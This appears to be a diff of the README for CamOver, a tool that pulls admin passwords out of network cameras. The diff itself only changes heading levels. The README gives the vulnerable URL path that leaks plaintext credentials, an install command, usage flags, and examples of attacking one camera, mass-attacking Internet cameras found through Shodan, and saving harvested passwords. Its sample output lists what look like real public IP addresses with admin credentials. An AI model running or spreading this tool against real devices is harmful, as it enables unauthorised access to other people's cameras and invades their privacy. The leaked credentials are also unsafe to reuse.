@@ -21,19 +21,19 @@ Is a camera exploitation tool that allows to disclosure network camera admin pas
 
 Tool effectively looks for `http://{address}/system.ini?loginuse&loginpas` and reads the `username:password` plaintext from the `system.ini` file.
 
-### Installation
+## Installation
 
 ```plain
 python3 -m pip install git+https://github.com/EntySec/CamOver
 ```
 
-### Usage
+## Usage
 
 ```plain
 camover [-h] [-t] [-o OUTPUT] [-i INPUT] [-a ADDRESS] [--shodan SHODAN] [--zoomeye ZOOMEYE] [-p PAGES]
 ```
 
-### Flags
+## Flags
 
 ```plain
 CamOver is a camera exploitation tool that allows to disclosure network camera admin password.
@@ -53,9 +53,9 @@ optional arguments:
                         Number of pages you want to get from ZoomEye.
 ```
 
-### Examples
+## Examples
 
-#### Exploiting single camera
+### Exploiting single camera
 
 Let's hack my camera just for fun.
 
@@ -63,7 +63,7 @@ Let's hack my camera just for fun.
 camover -a 192.168.99.100
 ```
 
-#### Exploiting cameras from Internet
+### Exploiting cameras from Internet
 
 Let's try to use Shodan search engine to exploit cameras over Internet, we will use it with `-t` for fast exploitation.
 
@@ -89,7 +89,7 @@ $ camover -t --shodan [REDACTED]
 [+] (200.126.178.171:81) - admin:888888
 ```
 
-#### Exploiting cameras from input file
+### Exploiting cameras from input file
 
 Let's try to use opened database of cameras with -t for fast exploitation.
 
@@ -99,6 +99,6 @@ camover -t -i cameras.txt -o passwords.txt
 
 NOTE: It will exploit all cameras in `cameras.txt` list by their addresses and save all obtained passwords to `passwords.txt`.
 
-### URL list
+## URL List
 
 * [Github.com - CamOver](https://github.com/EntySec/CamOver)
